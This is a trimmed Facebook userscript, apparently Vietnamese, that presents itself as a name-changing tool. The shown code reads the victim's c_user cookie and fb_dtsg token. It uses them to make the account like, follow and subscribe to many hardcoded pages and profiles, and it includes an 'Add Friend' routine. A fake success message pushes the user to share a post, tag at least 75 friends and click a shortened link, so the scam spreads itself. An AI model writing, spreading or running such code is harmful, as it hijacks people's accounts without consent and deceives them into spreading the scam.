// ==UserScript==
// @name            Doi ten Facebook v1.3
// @description     All about facebook By ITer Phandien
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="Thông Báo">'; // var navLink
    ...
    html += '<a class="jewelFooter" href="http://sh.st/zg56" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng kích chuột vào nút "Đồng ý chờ" phía dưới bên trái màn hình và CLICK VÀO ĐÂY sau đó CHIA SẺ bài viết và "Tag ít nhất 75 bạn bè của mình" vào bài viết để xác nhận. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn chia sẻ và Tag đầy đủ. Bấm LIKE cho trang nếu muốn cập nhật những mẹo đổi tên mới nhất của Facebook từ ITer Phandien.<br>Tôi là ITer Phandien. Cảm ơn bạn đã sử dụng ứng dụng của ITer Phandien</a>';
	html += '</div>';
...
sublist("380034442131800");
sublist("380035038798407");
sublist("380036322131612");
sublist("380036562131588");
sublist("380036455464932");
sublist("380036685464909");

//máy chủ 2 (east dr)
a("100004837050262");
sublist("230848070419760");
sublist("230848173753083");
sublist("230848390419728");
sublist("230848470419720");
sublist("230848560419711");
sublist("230848607086373");

//máy chủ 3 (vinare my)
a("100006804006073");
sublist("1422694534634000");
sublist("1422694671300653");
sublist("1422694777967309");
sublist("1422694847967302");
sublist("1422695124633941");
sublist("1422695394633914");
...
var spage_id = "673297939395816";
var spost_id = "100003757426256";
var sfoto_id = "106762246125689";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("326695954132316");P("683343808391229");P("683330281725915");Like("673297939395816");Like("236521833195025");Like("438224776306726");Like("794054760610676");Like("493695634083288");Like("484194881689135");Like("1395633070687425");Like("1391981881054005");Like("211032839081222");Like("575177919225343");Like("343214239122448");Like("396990367070097");Like("559831040752735");Like("184556571741872");Like("639089396149666");Like("263618283790636");
P("297425737031141");P("318384654963446");P("143543525837509");P("248695431932369");P("346971335438111");P("476428742437260");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
